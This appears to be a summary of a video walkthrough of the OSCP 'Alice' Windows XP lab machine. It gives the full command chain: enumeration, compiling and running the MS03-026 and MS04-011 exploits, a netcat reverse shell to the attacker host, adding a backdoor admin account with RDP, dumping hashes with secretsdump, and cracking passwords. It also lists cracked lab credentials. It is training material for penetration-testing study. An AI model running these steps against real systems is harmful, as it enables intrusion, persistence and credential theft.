This is a comprehensive summary of the steps and commands used to exploit the **Alice** Windows XP machine, as demonstrated by the OffSec student mentor. The methodology aligns with the core requirements of the OSCP exam, particularly the non-Metasploit approach.

The machine is a **Windows XP** target and the exploitation path focuses on a **Buffer Overflow** vulnerability in the RPC service, followed by stabilizing the shell and performing post-exploitation.

-----

## 1\. Preparation and Initial Setup

The mentor emphasizes setting up a robust workspace using `tmux` and environment variables.

| Step | Notes | Example Commands (Kali Linux) |
| :--- | :--- | :--- |
| **Workspace** | Use **tmux** to manage multiple windows/panes (VPN, listener, enumeration). | `tmux new -s oscp` |
| **Set Variables** | Export the target IP (`$IP`) and your attacking machine's IP (needed for reverse shells). | `export IP=10.10.10.XX`<br>`export LHOST=10.11.12.XX` |
| **Update Tools** | Update tools/scripts cloned from GitHub, like `enum4linux`, before use. | `cd /opt/enum4linux-ng && git pull` |

-----

## 2\. Enumeration and Service Identification

| Step | Notes | Commands (Kali Linux) |
| :--- | :--- | :--- |
| **Initial Nmap Scan** | Identify open ports. The scan revealed: **135, 139, 445, 1025** [[12:20](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=740)]. | `nmap -p135,139,445,1025 -sC -sV $IP -oN nmap/alice_scans` |
| **OS Fingerprinting (Nmap)** | The service scan reveals the OS as **Windows XP** [[13:13](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=793)]. | (Result of Nmap scan above) |
| **Deep Enumeration (Enum4linux)** | Used to obtain more detail, confirming **Windows Version 5.1** [[18:13](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=1093)]. | `enum4linux -a $IP -oA enum/alice_details` |
| **Deep Enumeration (SMBMap)** | An alternative method to fingerprint the OS via verbosity. | `smbmap -H $IP -v` [[19:54](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=1194)] |

-----

## 3\. Exploitation (Initial Shell)

The target is **RPC** (Remote Procedure Call) running on Windows XP, specifically looking for buffer overflow vulnerabilities.

| Exploit | Exploit-DB ID | Target Service |
| :--- | :--- | :--- |
| **MS03-026** | **264** | RPC DCOM Interface |
| **MS04-011** | **295** | LSASS (via RPC) |

### 3.1. Exploit Compilation

| Exploit | Notes | Commands (Kali Linux) |
| :--- | :--- | :--- |
| **MS03-026 (C Code)** | Standard GCC compilation for Linux execution. | `gcc 264.c -o ms03-026` [[26:42](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=1602)] |
| **MS04-011 (Windows Binary)**| Cross-compile using MinGW for Windows 32-bit (`.exe`). **Requires the `ws2_32` library.** | `i686-w64-mingw32-gcc 295.c -o ms04-011.exe -lws2_32` [[27:13](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=1633)] |

### 3.2. Exploit Execution

| Exploit | Shell Type & Port | Commands (Kali Linux) |
| :--- | :--- | :--- |
| **MS03-026** | **Bind Shell** on **TCP 4444** (hardcoded in the exploit) [[30:29](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=1829)]. Target ID **6** was used for Windows XP SP1 [[29:21](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=1761)]. | **1. Run:** `./ms03-026 6 $IP` [[29:31](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=1771)]<br>**2. Connect:** `nc $IP 4444` |
| **MS04-011** | **Bind Shell** on **TCP 443** (specified by user) [[33:54](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2034)]. | **1. Run:** `./ms04-011.exe -target 0 -ip $IP -port 443`<br>**2. Connect:** `nc $IP 443` |

-----

## 4\. Shell Stabilization and Persistence

Buffer overflow shells are unstable. A reliable Netcat reverse shell is established via a reliable file transfer method.

| Step | Notes | Commands (Kali Linux) |
| :--- | :--- | :--- |
| **Transfer Setup (Impacket SMB)** | Host `nc.exe` and `whoami.exe` on a local SMB share to be retrieved by the Windows machine. | `impacket-smbserver smb .` [[35:41](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2141)] |
| **Copy Binaries (Windows Shell)** | Mount the share and copy the files to a reliable location on the target machine (e.g., `C:\WINDOWS\Tasks`). | **1. Mount:** `net use z: \\$LHOST\smb` [[36:06](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2166)]<br>**2. Copy:** `copy z:\nc.exe C:\WINDOWS\Tasks\` [[37:41](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2261)] |
| **Reverse Shell Listener** | Set up a new listener on a new port (e.g., 9001). | `nc -lvnp 9001` [[38:18](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2298)] |
| **Spawn Reverse Shell (Windows)** | Execute the copied Netcat binary to connect back to your listener. | `C:\WINDOWS\Tasks\nc.exe -e cmd.exe $LHOST 9001` [[38:30](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2310)] |

-----

## 5\. Post-Exploitation and Looting

### 5.1. Password Cracking

The mentor found a file named **`bank_account.zip`** in the root of the drive [[34:47](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2087)].

| Step | Notes | Commands (Kali Linux) |
| :--- | :--- | :--- |
| **Transfer Zip** | Copy the zip file from the target to your Kali machine. | `copy C:\bank_account.zip /loot/bank_account.zip` (via SMB share or similar) [[40:05](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2405)] |
| **Prepare Hash** | Convert the zip file into a hash format for John the Ripper. | `zip2john bank_account.zip > zip.hash` [[44:48](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2688)] |
| **Crack Password** | Crack the hash using a wordlist (e.g., `rockyou.txt`). **Password found: alice** [[45:34](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2734)]. | `john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash` |
| **Loot Found** | The zip contained a file with credentials: **bob\_w:ilovesilenthill** [[46:31](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2791)]. | (Internal to the file) |

### 5.2. Hash Dumping and RDP Access

Since **Mimikatz** fails on Windows XP [[40:36](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2436)], the goal shifts to creating a new user with RDP access and using Impacket's remote hash dump capabilities.

| Step | Notes | Commands (Windows Shell) |
| :--- | :--- | :--- |
| **Create Admin User** | A `.bat` script is run remotely from the SMB share to: 1. Add a new user (`siddicky`). 2. Add the user to the `Administrators` and `Remote Desktop Users` groups. 3. Enable RDP via registry key. | `\\$LHOST\smb\siddicky.bat` [[43:03](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2583)] |
| **Remote Hash Dump** | Use `impacket-secretsdump` to extract NT hashes remotely using the newly created admin account. | `impacket-secretsdump -outputfile hashes siddicky:password@$IP` [[43:39](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2619)] |
| **Crack Hashes** | Crack the SAM hashes file. **Password found for user alice: allisonhere** [[52:39](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=3159)]. | `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.sam` |
| **Root Flag** | The `Proof.txt` file (the final objective) is located on the administrator's desktop. | `C:\Documents and Settings\Administrator\Desktop\Proof.txt` [[47:28](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=2848)] |

-----

## 6\. Cleanup

Always clean up artifacts, especially any created users or transferred files, when exiting an OSCP lab machine.

| Step | Notes | Commands (Windows Shell) |
| :--- | :--- | :--- |
| **Remove Files** | Delete any binaries or files copied to the target machine (e.g., `nc.exe`). | `del C:\WINDOWS\Tasks\nc.exe` [[55:36](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=3336)] |
| **Remove User** | Delete the user created for persistence/RDP. | `net user siddicky /delete` (Not shown, but highly recommended) |
| **Disconnect** | Disconnect all shells, RDP sessions, and unmount shares. | `net use * /delete` [[55:15](http://www.youtube.com/watch?v=Zma6Mk5bEI8&t=3315)] |
http://googleusercontent.com/youtube_content/0